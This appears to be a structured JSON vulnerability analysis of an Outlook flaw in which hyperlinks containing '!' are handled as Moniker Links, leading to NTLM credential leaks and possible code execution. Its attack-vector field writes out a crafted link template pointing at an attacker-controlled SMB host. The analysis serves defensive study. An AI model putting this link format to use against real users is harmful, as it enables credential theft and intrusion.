{
  "Root cause of vulnerability": "Improper handling of specially crafted hyperlinks in Microsoft Outlook, specifically those containing a '!' character, which are then treated as 'Moniker Links'. This leads to the parsing of the link using the `MkParseDisplayName` API which can trigger the execution of a COM object.",
  "Weaknesses/vulnerabilities present": "The vulnerability lies in the insecure parsing of Moniker Links by Outlook, specifically how it uses the `MkParseDisplayName` API. This allows an attacker to force Outlook to interpret a specially crafted file path as a COM moniker, leading to unintended behavior, including the potential for arbitrary code execution.",
  "Impact of exploitation": "Exploitation can lead to: \n   1.  Leaking of local NTLM credential information. \n   2.  Arbitrary code execution by exploiting vulnerabilities in the application (like Microsoft Word) that is launched as a COM server by the `MkParseDisplayName` API call. The code execution bypasses the Protected View mode of applications like Word, which increases the risk.",
  "Attack vectors": "The attack vector is through a specially crafted hyperlink in an email. The hyperlink must contain a '!' character and a file path, formatted as `file:///\\<attacker_ip>\path\to\file.rtf!something`.",
  "Required attacker capabilities/position": "The attacker needs to be able to send emails to the victim containing the malicious hyperlink. The attacker also needs to control the file server referenced in the hyperlink (e.g. `\\\\10.10.111.111`) and the content of the file (e.g. `test.rtf`) being accessed. The victim's network needs to allow outbound SMB traffic for the attacker to leak NTLM credentials or potentially execute code on a remote server through a vulnerable application (like Word)."
